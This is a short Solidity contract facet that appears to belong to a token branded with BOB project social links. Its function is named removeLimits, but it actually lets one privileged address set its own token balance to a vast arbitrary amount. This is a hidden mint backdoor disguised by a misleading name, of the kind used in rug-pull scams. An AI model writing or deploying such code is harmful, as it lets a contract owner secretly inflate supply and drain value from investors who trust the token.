/*
 * SPDX-License-Identifier: MIT
 * Telegram: https://t.me/gobobxyz
 * Twitter: https://twitter.com/build_on_bob
 * Website: https://www.gobob.xyz/
 */
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
